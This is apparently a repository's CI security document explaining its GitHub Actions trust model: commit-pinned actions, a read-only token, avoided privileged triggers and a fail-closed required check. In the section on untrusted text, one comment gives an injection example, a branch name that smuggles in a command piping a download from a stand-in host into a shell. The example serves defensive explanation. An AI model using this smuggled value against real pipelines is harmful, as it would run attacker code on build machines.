# CI Security

What continuous integration is trusted with, and why it is trusted with no more
than that.

This document owns the **trust model** and the procedures that maintain it.
Which checks are mandatory, and what a failure of one means, belongs to
[`QUALITY_GATES.md`](QUALITY_GATES.md); the lint and type rules belong to
[`STATIC_ANALYSIS.md`](STATIC_ANALYSIS.md). None of the three restates the
others.

Everything here is asserted by `tests/contract/test_ci_security_contract.py`.
Where this document and that module disagree, the module is right and the
disagreement is a defect — [`SOURCE_OF_TRUTH.md`](SOURCE_OF_TRUTH.md).

---

## The threat this is about

A GitHub Actions run is a machine with a token, executing code from several
authors, on content that anybody can influence. Three of those are worth naming
separately.

**Code GLOBIN did not write.** Every `uses:` fetches a program from another
repository and runs it with the same access as the rest of the job. The
repository's owner can change what that program does at any time.

**A token the job did not ask for.** `GITHUB_TOKEN` is minted per run. Its
default scope is a repository setting, so a workflow that says nothing about
permissions inherits whatever that setting happens to be, including changes
nobody applied to this repository deliberately.

**Text an outside contributor chose.** A branch name, a pull request title, a
commit message. Harmless as data; a fragment of shell script when interpolated
into one.

GLOBIN's CI runs no secret, reaches no exchange and writes nothing back. That
does not make the above irrelevant — it makes the mitigations cheap, because
nothing here needs the capabilities being withheld.

---

## Actions are pinned to commits, and the comment is not the pin

Every remote action is referenced by a full forty-character commit SHA. A tag is
a mutable label: the action's owner can move `v5` to a different commit, and a
moved tag changes what runs against this repository with no diff and no
notification.

Because forty hex characters tell a reader nothing, each pin carries a trailing
comment naming the release:

```yaml
uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5.1.0
```

**The SHA executes. The comment does not.** That asymmetry is the reason
[`action-pins.toml`](action-pins.toml) exists. Until Phase 013's hardening, two
of this repository's four comments named a version their commit did not have —
`actions/checkout@fbc6f39` was labelled `v5.0.0` and is `v5.1.0`,
`actions/setup-python@ece7cb06` was labelled `v6.0.0` and is `v6.3.0`. Nothing
broke and nothing failed, because nothing was checking. The manifest records what
was verified and against which upstream, and the contract module compares it
against the workflow in both directions, so a comment can no longer drift alone.

Two further rules:

- **A local reference is not pinned.** `uses: ./...` names something inside this
  repository, already fixed by the commit under test. It has no upstream to be
  pinned to and is exempt by construction, not by exception.
- **First-party only.** Every action in use is an `actions/*` repository.
  Adding a third-party action — or a fork, or a mirror of a familiar name — is a
  decision that must be recorded here, not a default that arrives with a
  copied snippet.

Phase 013 changed no SHA. Correcting a comment is not an upgrade, and pinning
work must not become a dependency-bump round: choosing a new version is
[Phase 014's](../../ROADMAP.md) review process, which does not exist yet.

### Updating a pin

Nine steps, in order. There is no bot and no automatic updater; adding one is out
of scope until dependency review exists.

1. Confirm the upstream repository is the first-party one, spelled exactly.
2. Decide the intended release, and why it is being adopted.
3. Resolve that tag to its commit against **two independent sources** that agree.
   The GitHub REST API and the raw git protocol are different code paths to the
   same upstream; one API alone is a single point of trust:

   ```bash
   git ls-remote --tags --refs https://github.com/actions/checkout.git
   ```

   For an annotated tag the API's ref object has type `tag` rather than `commit`,
   and must be dereferenced to reach the commit. Record the observed value.
4. Replace the SHA in `.github/workflows/quality.yml`.
5. Update the version comment beside it in the same edit.
6. Update the entry in [`action-pins.toml`](action-pins.toml), including
   `verified`.
7. Run the policy tests.
8. Run the full gate.
9. Read the diff, and confirm the SHA changed in exactly the places intended.

Record the resolution in the phase's ledger under `docs/research/`, per
[`SOURCE_POLICY.md`](../SOURCE_POLICY.md). A SHA nobody verified is a SHA nobody
can vouch for, and the ledger is where vouching is written down.

---

## The token starts read-only

Permissions are declared at workflow level as `contents: read`. Declaring them
there rather than per job means a job added later starts read-only instead of
inheriting the repository default.

A job needing more would raise it at job level, for that job only, naming the
scope and the reason. None does. `write-all` is never acceptable — it is not a
convenience, it is every scope at once.

`id-token: write` is refused alongside the write scopes despite granting nothing
by itself: it mints an OIDC token for exchange with a cloud provider, and that is
a capability this repository should acquire by decision rather than inherit.

No secret is referenced, and there is none to reference. Secret storage and
credential handling are Phase 015's subject.

---

## Privileged triggers, and text that becomes script

The workflow runs on `push`, `pull_request` and `merge_group`. It does **not**
run on `pull_request_target` or `workflow_run`.

`pull_request_target` runs with the base repository's trust — a writable token
and access to secrets — while describing a pull request anybody may have
authored. `workflow_run` is the same hazard one step removed: it fires after
another workflow and can be induced to consume that workflow's artifacts under
elevated trust. Checks that need no secret have no use for either.

Untrusted event fields are never interpolated into a `run:` block. The distinction
is not stylistic:

```yaml
# Prohibited. The value is pasted into the script before the shell sees it, so a
# branch named a"; curl evil.sh | sh; " is a command.
run: echo "${{ github.event.pull_request.title }}"

# Permitted. GitHub sets a variable; the script reads one.
env:
  TITLE: ${{ github.event.pull_request.title }}
run: echo "$env:TITLE"
```

The contract module carries the list of fields treated as attacker-controlled,
and a test proving the `env:` form is *not* flagged. A rule that forbade its own
remedy would be a rule people switch off.

---

## One required check, and it fails closed

The check to mark as required on `master` is named in
`[tool.globin.workflow] required_check`. It is the only check that should be
required: it is stable by construction, carrying no operating system, interpreter
version or matrix value, so a branch protection rule survives a change to any of
them.

Branch protection is not configured here. It is a repository setting, and no file
in this repository can enable it — see [`QUALITY_GATES.md`](QUALITY_GATES.md).

Fail-closed is the principle behind the whole aggregate. A check that cannot fail
is decoration, so `continue-on-error: true`, `|| true` and `exit 0` are all
prohibited and asserted absent. More subtly, a job whose dependency failed is
*skipped* by default, and a skipped required check does not block a merge the way
a failing one does — which is why the aggregate runs on `!cancelled()` and why
`cancelled` and `skipped` are both read as unmeasured rather than passed. Doubt
about what ran casts doubt on what passed.

## Merge queue readiness

The `merge_group` trigger is declared so that the required check can run inside a
merge queue. Nothing here enables a queue — again, a repository setting — but a
workflow that cannot run on that event leaves a queue waiting for a report that
never arrives, which rules the option out by accident rather than by choice.

Only the `checks_requested` activity type is documented for the event, and it is
named explicitly rather than left implicit, so that a type added later does not
start triggering this workflow without anybody deciding so.

## Concurrency, and the one place cancelling is wrong

The concurrency group is namespaced by `github.workflow`. Only one workflow
exists today, which is exactly why it is worth stating: the second one will be
added by somebody thinking about the second one, and two workflows sharing a group
cancel each other's runs.

Cancellation is conditional. A superseded pull request or merge-queue run is
worthless and is cancelled. A master run is not cancelled, because it is the only
thing that produces that commit's evidence bundle, and a cancelled job reports
`cancelled`, which the aggregate reads as unmeasured. Cancelling master runs would
trade a few runner-minutes for a permanent hole in the evidence chain, one commit
wide. Pushes to master queue instead.

## Timeouts

Every job declares `timeout-minutes`. An undeclared timeout is not the absence of
one: the job runs until GitHub's platform ceiling of six hours terminates it, long
enough that a job wedged on a network read looks like a job still working for most
of a working day.

The budgets live in `[tool.globin.workflow.timeouts]`, with the measured run
durations each was derived from recorded beside them. Two principles govern the
numbers: they are derived from observation rather than chosen for roundness, and
they carry enough margin that a cold runner or a slow package index produces a
slower run rather than a red one. A timeout tight enough to fire on ordinary
variation teaches people to re-run rather than to read.

---

## Running the policy checks

The contract module runs as part of the ordinary suite. On its own:

```bash
python -m pytest -q tests/contract/test_ci_security_contract.py
```

It is offline, reads only the working tree, and asserts nothing about upstream —
resolving a tag is a human step in the procedure above, not something the suite
does. Every checker in it is exercised twice: once against the real workflow, and
once against a deliberately broken copy held as a string. The broken copies are
never files, because `check-yaml` runs over everything committed and a file under
`.github/workflows/` is not a fixture but a workflow.

## Related

- [`QUALITY_GATES.md`](QUALITY_GATES.md) — which checks are mandatory
- [`STATIC_ANALYSIS.md`](STATIC_ANALYSIS.md) — the lint and type rules
- [`action-pins.toml`](action-pins.toml) — what each pinned commit was verified to be
- [ADR-0020](../adr/0020-verification-only-continuous-integration.md) — CI verifies, with least privilege and pinned actions
- [ADR-0042](../adr/0042-one-aggregate-check-decides-a-run-and-the-artifact-digest-lives-outside-the-artifact.md) — one aggregate check decides a run
